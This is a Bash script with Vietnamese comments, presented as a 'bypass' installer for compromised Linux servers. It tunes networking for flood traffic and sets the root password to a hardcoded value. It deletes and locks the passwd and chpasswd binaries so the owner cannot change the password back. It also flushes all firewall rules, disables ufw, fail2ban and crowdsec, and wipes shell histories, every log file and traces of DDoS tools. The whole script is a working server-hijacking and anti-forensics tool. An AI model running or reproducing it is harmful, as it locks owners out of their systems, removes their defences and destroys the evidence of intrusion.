#!/bin/bash

export HISTFILE=/dev/null
echo -e "Bắt đầu cài đặt bypass"
echo "[+] Bật chế độ bypass"
sysctl -w net.core.rmem_max=134217728 &>/dev/null
sysctl -w net.core.wmem_max=134217728 &>/dev/null
sysctl -w net.ipv4.tcp_mem="134217728 134217728 134217728" &>/dev/null
sysctl -w net.ipv4.tcp_rmem="4096 87380 134217728" &>/dev/null
sysctl -w net.ipv4.tcp_wmem="4096 65536 134217728" &>/dev/null
sysctl -w net.core.netdev_max_backlog=50000 &>/dev/null
sysctl -w net.core.somaxconn=65535 &>/dev/null
sysctl -w net.ipv4.tcp_max_syn_backlog=65536 &>/dev/null
sysctl -w net.ipv4.tcp_syncookies=0 &>/dev/null
sysctl -w net.ipv4.tcp_timestamps=0 &>/dev/null
sysctl -w net.ipv4.conf.all.rp_filter=0 &>/dev/null
sysctl -w net.ipv4.conf.default.rp_filter=0 &>/dev/null
sysctl -w net.ipv4.conf.all.accept_source_route=1 &>/dev/null
sysctl -w fs.file-max=2097152 &>/dev/null
ulimit -n 999999 2>/dev/null
echo "* soft nofile 999999" >> /etc/security/limits.conf
echo "* hard nofile 999999" >> /etc/security/limits.conf

# ===== THAY MẬT KHẨU TRƯỚC KHI CHẶN =====
echo "[+] Bắt đầu thay passwd..."
echo "root:tbao123" | chpasswd
if [ $? -eq 0 ]; then
    echo "[+] Đã thay passwd mới: tbao123"
else
    echo "[!] Lỗi thay passwd - kiểm tra lại"
    exit 1
fi

# ===== BÂY GIỜ MỚI CHẶN THAY PASSWD =====
echo "[+] Bắt đầu chặn thay passwd..."

# Xóa binary thật trước
rm -f /usr/bin/passwd /bin/passwd
rm -f /usr/bin/chpasswd /bin/chpasswd /usr/sbin/chpasswd

# Tạo file giả và khóa chết
touch /usr/bin/passwd
chmod 000 /usr/bin/passwd
chattr +i /usr/bin/passwd 2>/dev/null

# Alias dự phòng
echo "alias chpasswd='echo \"Command disabled\"'" >> ~/.bashrc
echo "alias passwd='echo \"Command disabled\"'" >> ~/.bashrc
source ~/.bashrc 2>/dev/null

echo "[+] Đã chặn thay passwd"

# ===== RESET IPTABLES =====
echo "[+] Reset counter iptables..."
iptables -F && iptables -X && iptables -t nat -F && iptables -t mangle -F
iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT
nft flush ruleset &>/dev/null

# ===== TẮT DỊCH VỤ TƯỜNG LỬA =====
echo "[+] Tắt dịch vụ tường lửa..."
systemctl stop ufw fail2ban crowdsec &>/dev/null
systemctl disable ufw fail2ban crowdsec &>/dev/null

# ===== DỌN DẤU VẾT =====
echo "[!] Đang dọn dấu vết 100%..."
history -c
echo "" > /root/.bash_history
for u in $(cut -d: -f1 /etc/passwd); do 
    echo "" > /home/$u/.bash_history 2>/dev/null 
done
find / -name "*.log" -exec echo "" > {} \; 2>/dev/null
echo "" > /var/log/auth.log 2>/dev/null
echo "" > /var/log/syslog 2>/dev/null
echo "" > /var/log/kern.log 2>/dev/null
echo "" > /var/log/messages 2>/dev/null
echo "" > /var/log/wtmp 2>/dev/null
echo "" > /var/log/btmp 2>/dev/null
echo "" > /var/log/lastlog 2>/dev/null
rm -rf /root/zmap* /root/MHDDoS /root/archer* /tmp/* /var/tmp/* 2>/dev/null
conntrack -F &>/dev/null
ip neigh flush all &>/dev/null
iptables -Z -t filter 2>/dev/null
iptables -Z -t nat 2>/dev/null
iptables -Z -t mangle 2>/dev/null
iptables -Z -t raw 2>/dev/null
journalctl --rotate --vacuum-time=1s &>/dev/null

echo "[+] Đã sạch hoàn toàn"
echo "[+] Bypass hoàn tất! Mật khẩu root mới: tbao123"
